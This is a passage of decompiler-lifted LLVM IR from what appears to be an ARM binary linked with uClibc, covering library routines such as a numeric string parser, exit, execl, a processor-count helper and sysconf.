  %v0_26f74 = phi i32 [ %v0_26f50, %bb ], [ %v1_26f50, %dec_label_pc_26f50 ]
  %v1_26f54 = and i32 %v0_26f04, -17
  %v3_26f54 = icmp eq i32 %v1_26f54, 0
  br i1 %v3_26f54, label %dec_label_pc_26f60, label %bb60

bb60:                                             ; preds = %dec_label_pc_26f54
  br label %bb64

dec_label_pc_26f60:                               ; preds = %dec_label_pc_26f54
  %v1_26f60 = inttoptr i32 %v0_26f74 to i8*
  %v2_26f60 = load i8, i8* %v1_26f60, align 1
  %v7_26f64 = icmp eq i8 %v2_26f60, 48
  %v1_26f68 = add i32 %v0_26f04, 10
  store i32 %v1_26f68, i32* %r5.global-to-local, align 4
  br i1 %v7_26f64, label %dec_label_pc_26f74, label %bb61

bb61:                                             ; preds = %dec_label_pc_26f60
  br label %.thread8

dec_label_pc_26f74:                               ; preds = %dec_label_pc_26f60
  %v1_26f74 = add i32 %v0_26f74, 1
  %v2_26f74 = inttoptr i32 %v1_26f74 to i8*
  %v3_26f74 = load i8, i8* %v2_26f74, align 1
  %v4_26f74 = zext i8 %v3_26f74 to i32
  store i32 %v1_26f74, i32* %r4.global-to-local, align 4
  %v1_26f78 = or i32 %v4_26f74, 32
  %v7_26f7c = icmp eq i32 %v1_26f78, 120
  %v1_26f80 = add i32 %v0_26f04, 8
  store i32 %v1_26f80, i32* %r5.global-to-local, align 4
  br i1 %v7_26f7c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_26f74
  %v3_26f8c = mul i32 %v1_26f80, 2
  store i32 %v3_26f8c, i32* %r5.global-to-local, align 4
  %v2_26f90 = add i32 %v0_26f74, 2
  store i32 %v2_26f90, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_26f74, %bb61, %bb62
  %v1_2706430 = phi i32 [ %v0_26f08, %bb61 ], [ %v1_26f74, %bb62 ], [ %v1_26f74, %dec_label_pc_26f74 ]
  %v0_26fe021 = phi i32 [ %v0_26f74, %bb61 ], [ %v2_26f90, %bb62 ], [ %v1_26f74, %dec_label_pc_26f74 ]
  %v0_26f94 = phi i32 [ %v1_26f68, %bb61 ], [ %v3_26f8c, %bb62 ], [ %v1_26f80, %dec_label_pc_26f74 ]
  %v5_26f98 = icmp slt i32 %v0_26f94, 16
  br i1 %v5_26f98, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_2706429 = phi i32 [ %v0_26f08, %bb60 ], [ %v1_2706430, %.thread8 ], [ %v1_2706430, %bb63 ]
  %v0_26fe020 = phi i32 [ %v0_26f74, %bb60 ], [ %v0_26fe021, %.thread8 ], [ %v0_26fe021, %bb63 ]
  %v0_26fc0 = phi i32 [ %v0_26f04, %bb60 ], [ %v0_26f94, %.thread8 ], [ 16, %bb63 ]
  %v1_26f9c = add i32 %v0_26fc0, -2
  %tmp = icmp ugt i32 %v1_26f9c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_26fac

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_27060

dec_label_pc_26fac:                               ; preds = %bb64
  %v2_26fb4 = udiv i32 -1, %v0_26fc0
  %v3_26fb4 = urem i32 -1, %v0_26fc0
  store i32 %v0_26fc0, i32* %r1.global-to-local, align 4
  %v1_26fc4 = urem i32 %v3_26fb4, 256
  store i32 %v1_26fc4, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_26fb4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_26fe0

dec_label_pc_26fdc:                               ; preds = %bb71, %dec_label_pc_2703c
  %v0_26fdc = phi i32 [ %v1_2701c44, %bb71 ], [ %v0_26fdc.pre, %dec_label_pc_2703c ]
  br label %dec_label_pc_26fe0

dec_label_pc_26fe0:                               ; preds = %dec_label_pc_26fac, %dec_label_pc_26fdc
  %v1_2706427 = phi i32 [ %v1_2706429, %dec_label_pc_26fac ], [ %v0_26fdc, %dec_label_pc_26fdc ]
  %v0_2701c = phi i32 [ %v0_26fe020, %dec_label_pc_26fac ], [ %v0_26fdc, %dec_label_pc_26fdc ]
  %v1_26fe0 = inttoptr i32 %v0_2701c to i8*
  %v2_26fe0 = load i8, i8* %v1_26fe0, align 1
  %v3_26fe0 = zext i8 %v2_26fe0 to i32
  %v1_26fe4 = add nsw i32 %v3_26fe0, -48
  %v1_26fe8 = urem i32 %v1_26fe4, 256
  store i32 %v1_26fe8, i32* %r1.global-to-local, align 4
  %v1_26ff0 = or i32 %v3_26fe0, 32
  %tmp79 = icmp ult i32 %v1_26fe8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_26ff8

dec_label_pc_26ff8:                               ; preds = %dec_label_pc_26fe0
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_26ff0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_26ff8
  %v1_26ffc = add nsw i32 %v1_26ff0, -87
  %v5_27004 = urem i32 %v1_26ffc, 256
  store i32 %v5_27004, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_26fe0, %dec_label_pc_26ff8, %bb65
  %v3_27034 = phi i32 [ %v1_26fe8, %dec_label_pc_26fe0 ], [ 40, %dec_label_pc_26ff8 ], [ %v5_27004, %bb65 ]
  %v1_27008 = load i32, i32* %r5.global-to-local, align 4
  %v6_2700c = icmp slt i32 %v3_27034, %v1_27008
  br i1 %v6_2700c, label %dec_label_pc_27010, label %dec_label_pc_27060.loopexit

dec_label_pc_27010:                               ; preds = %bb66
  %v0_27010 = load i32, i32* %ip.global-to-local, align 4
  %v1_27010 = load i32, i32* %r8.global-to-local, align 4
  %v9_27010 = icmp eq i32 %v0_27010, %v1_27010
  br i1 %v9_27010, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_27010
  %v1_2701c40 = add i32 %v0_2701c, 1
  store i32 %v1_2701c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_27024

bb67:                                             ; preds = %dec_label_pc_27010
  %v3_27010 = icmp ult i32 %v0_27010, %v1_27010
  %v1_2701c = add i32 %v0_2701c, 1
  store i32 %v1_2701c, i32* %r4.global-to-local, align 4
  br i1 %v3_27010, label %dec_label_pc_27024, label %dec_label_pc_2703c

dec_label_pc_27024:                               ; preds = %bb67, %.thread39
  %v1_2701c44 = phi i32 [ %v1_2701c40, %.thread39 ], [ %v1_2701c, %bb67 ]
  %v4_2702c2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_27024 = load i32, i32* %sl.global-to-local, align 4
  %v3_27024 = icmp uge i32 %v3_27034, %v1_27024
  %v9_27024 = icmp eq i32 %v3_27034, %v1_27024
  %v2_27028 = xor i1 %v3_27024, true
  %v3_27028 = or i1 %v9_27024, %v2_27028
  br i1 %v3_27028, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_27024
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_27024, %bb68
  %v4_2702c = phi i32 [ %v4_2702c2443, %dec_label_pc_27024 ], [ 0, %bb68 ]
  %v2_2702c = xor i1 %v9_27024, true
  %v3_2702c = and i1 %v3_27024, %v2_2702c
  br i1 %v3_2702c, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_2702c = urem i32 %v4_2702c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_27030 = phi i32 [ %v5_2702c, %bb70 ], [ %v4_2702c, %bb69 ]
  %v2_27030 = icmp eq i32 %v0_27030, 0
  br i1 %v2_27030, label %bb71, label %dec_label_pc_2703c

bb71:                                             ; preds = %thread-pre-split
  %v4_27034 = mul i32 %v0_27010, %v1_27008
  %v5_27034 = add i32 %v4_27034, %v3_27034
  store i32 %v5_27034, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_26fdc

dec_label_pc_2703c:                               ; preds = %bb67, %thread-pre-split
  %v0_27044 = call i32 @__aeabi_read_tp()
  %v0_27048 = load i32, i32* %r7.global-to-local, align 4
  %v2_27048 = and i32 %v0_26f0c, %v0_27048
  store i32 %v2_27048, i32* %r7.global-to-local, align 4
  %v0_2704c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_2704c, i32* %ip.global-to-local, align 4
  %v3_27050 = load i16, i16* @global_var_42934.3040, align 2
  %v4_27050 = sext i16 %v3_27050 to i32
  %v3_27058 = add i32 %v4_27050, %v0_27044
  %v4_27058 = inttoptr i32 %v3_27058 to i32*
  store i32 34, i32* %v4_27058, align 4
  %v0_26fdc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_26fdc

dec_label_pc_27060.loopexit:                      ; preds = %bb66
  %v0_27060.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_27060

dec_label_pc_27060:                               ; preds = %.thread, %dec_label_pc_27060.loopexit
  %v1_27064 = phi i32 [ %v1_2706427, %dec_label_pc_27060.loopexit ], [ %v1_2706429, %.thread ]
  %v2_27064 = phi i32 [ %v0_27060.pre, %dec_label_pc_27060.loopexit ], [ %v0_26f00, %.thread ]
  %v2_27060 = icmp eq i32 %v2_27064, 0
  br i1 %v2_27060, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_27060
  %v3_27064 = inttoptr i32 %v2_27064 to i32*
  store i32 %v1_27064, i32* %v3_27064, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_27060, %bb72
  %v0_2706c = load i32, i32* %r7.global-to-local, align 4
  %v2_2706c = icmp eq i32 %v0_2706c, 0
  %. = select i1 %v2_2706c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_27078 = icmp eq i32 %v0_26f0c, 0
  %v0_270a4.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_27078, label %dec_label_pc_2709c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_270a4.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_27084, label %dec_label_pc_2709c

dec_label_pc_27084:                               ; preds = %bb76
  %v0_27088 = call i32 @__aeabi_read_tp()
  %v3_2708c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2708c = sext i16 %v3_2708c to i32
  %v3_27094 = add i32 %v4_2708c, %v0_27088
  %v4_27094 = inttoptr i32 %v3_27094 to i32*
  store i32 34, i32* %v4_27094, align 4
  %v0_27098 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_27098, i32* %ip.global-to-local, align 4
  %v0_2709c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2709c

dec_label_pc_2709c:                               ; preds = %bb76, %bb73, %dec_label_pc_27084
  %v0_270a4.pre = phi i32 [ %v0_270a4.pre.pre, %bb76 ], [ %v0_27098, %dec_label_pc_27084 ], [ %v0_270a4.pre.pre, %bb73 ]
  %v0_2709c = phi i32 [ %v0_2706c, %bb76 ], [ %v0_2709c.pre, %dec_label_pc_27084 ], [ %v0_2706c, %bb73 ]
  %v2_2709c = icmp eq i32 %v0_2709c, 0
  br i1 %v2_2709c, label %dec_label_pc_2709c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_2709c
  %v2_270a0 = sub i32 0, %v0_270a4.pre
  store i32 %v2_270a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_2709c._crit_edge

dec_label_pc_2709c._crit_edge:                    ; preds = %dec_label_pc_2709c, %bb77
  %v0_270a4 = phi i32 [ %v2_270a0, %bb77 ], [ %v0_270a4.pre, %dec_label_pc_2709c ]
  ret i32 %v0_270a4

; uselistorder directives
  uselistorder i32 %v0_270a4.pre, { 1, 0 }
  uselistorder i32 %v0_270a4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_2702c, { 1, 0 }
  uselistorder i1 %v3_27024, { 1, 0 }
  uselistorder i32 %v1_27024, { 1, 0 }
  uselistorder i32 %v5_27004, { 1, 0 }
  uselistorder i32 %v1_26ff0, { 1, 0 }
  uselistorder i32 %v1_26fe8, { 2, 0, 1 }
  uselistorder i32 %v0_2701c, { 1, 0, 2 }
  uselistorder i32 %v0_26fdc, { 1, 0 }
  uselistorder i32 %v3_26f8c, { 1, 0 }
  uselistorder i32 %v1_26f80, { 1, 0, 2 }
  uselistorder i32 %v0_26f74, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_26f50, { 0, 1, 3, 2 }
  uselistorder i32 %v0_26f0c, { 1, 0 }
  uselistorder i32 %v0_26f08, { 1, 0, 2, 3 }
  uselistorder i32 %v0_26f04, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_2709c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_2709c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_27060, { 1, 0 }
  uselistorder label %dec_label_pc_2703c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_26fe0, { 1, 0 }
  uselistorder label %dec_label_pc_26fdc, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_26f54, { 1, 0 }
  uselistorder label %dec_label_pc_26f50, { 1, 0 }
  uselistorder label %dec_label_pc_26f18, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  %v4_270d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 156) to i32*), align 4
  store i32 %v4_270d0, i32* @r4, align 4
  %v2_270d8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_270f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_270f0)
  %v0_27104 = load i32, i32* @r5, align 4
  %v2_27104 = add i32 %v0_27104, 20
  %v3_27104 = inttoptr i32 %v2_27104 to i32*
  %v4_27104 = load i32, i32* %v3_27104, align 4
  call void @__pseudo_branch(i32 %v4_27104)
  %v0_27114 = load i32, i32* @r5, align 4
  %v2_27114 = add i32 %v0_27114, 26048
  %v3_27114 = inttoptr i32 %v2_27114 to i32*
  %v4_27114 = load i32, i32* %v3_27114, align 4
  %v2_2711c = icmp eq i32 %v4_27114, 0
  br i1 %v2_2711c, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_27128 = xor i1 %v2_2711c, true
  call void @__pseudo_cond_branch(i1 %v2_27128, i32 %v4_27114)
  store i32 %v2_270d8, i32* @r0, align 4
  %v0_27138 = load i32, i32* @r5, align 4
  %v2_27138 = add i32 %v0_27138, 52
  %v3_27138 = inttoptr i32 %v2_27138 to i32*
  %v4_27138 = load i32, i32* %v3_27138, align 4
  call void @__pseudo_branch(i32 %v4_27138)
  %v0_27144 = call i32 @__GI___uClibc_fini()
  %v0_2714c = load i32, i32* @r5, align 4
  %v2_2714c = add i32 %v0_2714c, -127896
  %v2_27154 = icmp eq i32 %v2_2714c, 0
  br i1 %v2_27154, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_2715c = xor i1 %v2_27154, true
  call void @__pseudo_cond_branch(i1 %v2_2715c, i32 %v2_2714c)
  %v0_27160 = load i32, i32* @r6, align 4
  %v1_27164 = call i32 @__GI__exit(i32 %v0_27160)
  %v0_27168 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_27168, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_27168 = load i32, i32* @fp, align 4
  %v3_27168 = load i32, i32* @r1, align 4
  %v4_27168 = inttoptr i32 %v3_27168 to i32*
  store i32 %v1_27168, i32* %v4_27168, align 4
  %v6_27168 = load i32, i32* @r1, align 4
  %v7_27168 = sub i32 %v6_27168, %v4_27138
  store i32 %v7_27168, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_27180 = phi i32 [ %v1_27164, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_27180

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_27188 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_27188, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_2719c = ptrtoint i32* %stack_var_-40 to i32
  %v2_271a0 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_271b0

dec_label_pc_271b0:                               ; preds = %dec_label_pc_271b0, %entry
  %v0_271c4 = phi i32 [ 0, %entry ], [ %v1_271c4, %dec_label_pc_271b0 ]
  %stack_var_-36.0 = phi i32 [ %v2_271a0, %entry ], [ %v1_271b8, %dec_label_pc_271b0 ]
  %v1_271b4 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_271b4 = load i32, i32* %v1_271b4, align 4
  %v1_271b8 = add i32 %stack_var_-36.0, 4
  %v2_271bc = icmp eq i32 %v2_271b4, 0
  %v1_271c4 = add i32 %v0_271c4, 1
  store i32 %v1_271c4, i32* @lr, align 4
  br i1 %v2_271bc, label %dec_label_pc_271cc, label %dec_label_pc_271b0

dec_label_pc_271cc:                               ; preds = %dec_label_pc_271b0
  %v3_271cc = mul i32 %v1_271c4, 4
  %v1_271d0 = add i32 %v3_271cc, 18
  %v1_271d4 = and i32 %v1_271d0, -8
  %v2_271d8 = sub i32 %v2_2719c, %v1_271d4
  %v2_271e0 = inttoptr i32 %v2_271d8 to i32*
  store i32 %arg2, i32* %v2_271e0, align 4
  %v0_271ec = load i32, i32* @sp, align 4
  store i32 %v0_271ec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_271f4

dec_label_pc_271f4:                               ; preds = %dec_label_pc_271f4, %dec_label_pc_271cc
  %v1_27208 = phi i32 [ %v0_271ec, %dec_label_pc_271cc ], [ %v5_27208, %dec_label_pc_271f4 ]
  %stack_var_-36.1 = phi i32 [ %v2_271a0, %dec_label_pc_271cc ], [ %v1_27200, %dec_label_pc_271f4 ]
  %v1_271f8 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_271f8 = load i32, i32* %v1_271f8, align 4
  %v0_271fc = load i32, i32* @lr, align 4
  %v1_271fc = add i32 %v0_271fc, -1
  store i32 %v1_271fc, i32* @lr, align 4
  %v7_271fc = icmp eq i32 %v0_271fc, 1
  %v1_27200 = add i32 %stack_var_-36.1, 4
  %v2_27208 = add i32 %v1_27208, 4
  %v3_27208 = inttoptr i32 %v2_27208 to i32*
  store i32 %v2_271f8, i32* %v3_27208, align 4
  %v4_27208 = load i32, i32* %ip.global-to-local, align 4
  %v5_27208 = add i32 %v4_27208, 4
  store i32 %v5_27208, i32* %ip.global-to-local, align 4
  br i1 %v7_271fc, label %dec_label_pc_27210, label %dec_label_pc_271f4

dec_label_pc_27210:                               ; preds = %dec_label_pc_271f4
  %v0_27214 = load i32, i32* %r4.global-to-local, align 4
  %v2_27214 = add i32 %v0_27214, 64
  %v3_27214 = inttoptr i32 %v2_27214 to i32*
  %v4_27214 = load i32, i32* %v3_27214, align 4
  %v1_27218 = inttoptr i32 %v4_27214 to i32*
  %v2_27218 = load i32, i32* %v1_27218, align 4
  %v4_2721c = call i32 @__GI_execve(i32 %arg1, i32 %v0_271ec, i32 %v2_27218, i32 %v4_27214)
  ret i32 %v4_2721c

; uselistorder directives
  uselistorder i32 %v5_27208, { 1, 0 }
  uselistorder i32 %v0_271fc, { 1, 0 }
  uselistorder i32 %v0_271ec, { 1, 0, 2 }
  uselistorder i32 %v1_271c4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34296), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_27254 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -34296))
  store i32 %v1_27254, i32* @r6, align 4
  %v2_27258 = icmp eq i32 %v1_27254, 0
  br i1 %v2_27258, label %dec_label_pc_272d8, label %dec_label_pc_27260

dec_label_pc_27260:                               ; preds = %entry
  store i32 360, i32* @sl, align 4
  %v0_27268 = load i32, i32* @r4, align 4
  %v2_27268 = add i32 %v0_27268, -34284
  store i32 %v2_27268, i32* @r8, align 4
  %v2_2726c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_2726c, i32* @r7, align 4
  br label %bb18

dec_label_pc_27274:                               ; preds = %bb18
  %v3_27274 = load i32, i32* %stack_var_-36, align 4
  %v1_27278 = inttoptr i32 %v3_27274 to i32*
  %v2_27278 = load i32, i32* %v1_27278, align 4
  %v1_2727c = inttoptr i32 %v2_27278 to i8*
  %v2_2727c = load i8, i8* %v1_2727c, align 1
  %v7_27280 = icmp eq i8 %v2_2727c, 99
  br i1 %v7_27280, label %dec_label_pc_27288, label %.backedge3

dec_label_pc_27288:                               ; preds = %dec_label_pc_27274
  %v1_27288 = add i32 %v2_27278, 1
  %v2_27288 = inttoptr i32 %v1_27288 to i8*
  %v3_27288 = load i8, i8* %v2_27288, align 1
  %v7_2728c = icmp eq i8 %v3_27288, 112
  br i1 %v7_2728c, label %dec_label_pc_27294, label %.backedge3

dec_label_pc_27294:                               ; preds = %dec_label_pc_27288
  %v1_27294 = add i32 %v2_27278, 2
  %v2_27294 = inttoptr i32 %v1_27294 to i8*
  %v3_27294 = load i8, i8* %v2_27294, align 1
  %v7_27298 = icmp eq i8 %v3_27294, 117
  br i1 %v7_27298, label %dec_label_pc_272a0, label %.backedge3

dec_label_pc_272a0:                               ; preds = %dec_label_pc_27294
  %v1_272a0 = add i32 %v2_27278, 3
  %v2_272a0 = inttoptr i32 %v1_272a0 to i8*
  %v3_272a0 = load i8, i8* %v2_272a0, align 1
  %v4_272a0 = zext i8 %v3_272a0 to i32
  %v0_272a4 = load i32, i32* @r4, align 4
  %v1_272a4 = load i32, i32* @sl, align 4
  %v2_272a4 = add i32 %v1_272a4, %v0_272a4
  %v3_272a4 = inttoptr i32 %v2_272a4 to i32*
  %v4_272a4 = load i32, i32* %v3_272a4, align 4
  %v2_272a8 = mul nuw nsw i32 %v4_272a0, 2
  %v2_272ac = add i32 %v4_272a4, %v2_272a8
  %v3_272ac = inttoptr i32 %v2_272ac to i16*
  %v4_272ac = load i16, i16* %v3_272ac, align 2
  %v1_272b0 = and i16 %v4_272ac, 8
  %v2_272b0 = icmp eq i16 %v1_272b0, 0
  br i1 %v2_272b0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_272a0
  %v1_272b4 = load i32, i32* @r5, align 4
  %v2_272b4 = add i32 %v1_272b4, 1
  store i32 %v2_272b4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_272a0, %dec_label_pc_27274, %dec_label_pc_27288, %dec_label_pc_27294
  %v0_272b8.pre = load i32, i32* @r6, align 4
  %v0_272c4.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_27260
  %v0_272c4 = phi i32 [ %v0_272c4.pre, %.backedge3 ], [ %v2_27268, %dec_label_pc_27260 ]
  %v0_272b8 = phi i32 [ %v0_272b8.pre, %.backedge3 ], [ %v1_27254, %dec_label_pc_27260 ]
  %v4_272c8 = inttoptr i32 %v0_272b8 to i32*
  %v5_272c8 = call i32 @__GI_config_read(i32* %v4_272c8, i32 %v2_2726c, i32 258, i32 %v0_272c4)
  %v2_272cc = icmp eq i32 %v5_272c8, 0
  br i1 %v2_272cc, label %dec_label_pc_2733c, label %dec_label_pc_27274

dec_label_pc_272d8:                               ; preds = %entry
  %v0_272dc = load i32, i32* @r4, align 4
  %v2_272dc = add i32 %v0_272dc, -34280
  store i32 %v2_272dc, i32* @r0, align 4
  %v1_272e0 = call i32 @__GI_config_open(i32 %v2_272dc)
  store i32 %v1_272e0, i32* @r6, align 4
  %v2_272e4 = icmp eq i32 %v1_272e0, 0
  br i1 %v2_272e4, label %bb19, label %dec_label_pc_272f0

bb19:                                             ; preds = %dec_label_pc_272d8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_2733c

dec_label_pc_272f0:                               ; preds = %dec_label_pc_272d8
  %v0_272f4 = load i32, i32* @r4, align 4
  %v2_272f4 = add i32 %v0_272f4, -34264
  store i32 %v2_272f4, i32* @r8, align 4
  %v2_272fc = add i32 %v0_272f4, -34228
  store i32 %v2_272fc, i32* @r7, align 4
  %v2_27300 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_27300, i32* @r4, align 4
  br label %bb21

dec_label_pc_27308:                               ; preds = %bb21
  %v0_27334 = load i32, i32* @r8, align 4
  %v3_27308 = load i32, i32* %stack_var_-36, align 4
  %v1_2730c = inttoptr i32 %v3_27308 to i32*
  %v2_2730c = load i32, i32* %v1_2730c, align 4
  store i32 %v2_2730c, i32* @r1, align 4
  %v2_27310 = inttoptr i32 %v0_27334 to i8*
  %v3_27310 = call i32 @__GI_strcoll(i8* %v2_27310, i32 %v2_2730c)
  %v2_27314 = icmp eq i32 %v3_27310, 0
  br i1 %v2_27314, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_27308
  %v1_27318 = load i32, i32* @r5, align 4
  %v2_27318 = add i32 %v1_27318, 1
  store i32 %v2_27318, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_27308
  %v0_27324.pre = load i32, i32* @r7, align 4
  %v0_27328.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_272f0
  %v0_27328 = phi i32 [ %v0_27328.pre, %.backedge ], [ %v1_272e0, %dec_label_pc_272f0 ]
  %v0_27324 = phi i32 [ %v0_27324.pre, %.backedge ], [ %v2_272fc, %dec_label_pc_272f0 ]
  %v4_2732c = inttoptr i32 %v0_27328 to i32*
  %v5_2732c = call i32 @__GI_config_read(i32* %v4_2732c, i32 %v2_27300, i32 459266, i32 %v0_27324)
  %v2_27330 = icmp eq i32 %v5_2732c, 0
  br i1 %v2_27330, label %dec_label_pc_2733c, label %dec_label_pc_27308

dec_label_pc_2733c:                               ; preds = %bb18, %bb21, %bb19
  %v0_2733c = load i32, i32* @r6, align 4
  %v1_27340 = inttoptr i32 %v0_2733c to i32*
  %v2_27340 = call i32 @__GI_config_close(i32* %v1_27340)
  %v0_27344 = load i32, i32* @r5, align 4
  %v2_27344 = icmp eq i32 %v0_27344, 0
  %.v0_27344 = select i1 %v2_27344, i32 1, i32 %v0_27344
  ret i32 %.v0_27344

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_2733c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_27770

bb:                                               ; preds = %entry
  %v7_27394 = mul i32 %arg1, 4
  %v8_27394 = add i32 %v7_27394, ptrtoint (i32* @global_var_2739c.3270 to i32)
  call void @__pseudo_branch(i32 %v8_27394)
  br label %dec_label_pc_27770

dec_label_pc_27770:                               ; preds = %bb, %entry
  %v0_27774 = call i32 @__aeabi_read_tp()
  %v3_27778 = load i16, i16* @global_var_42934.3040, align 2
  %v4_27778 = sext i16 %v3_27778 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_27784 = add i32 %v4_27778, %v0_27774
  %v4_27784 = inttoptr i32 %v3_27784 to i32*
  store i32 22, i32* %v4_27784, align 4
  %v0_27968 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_27968

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

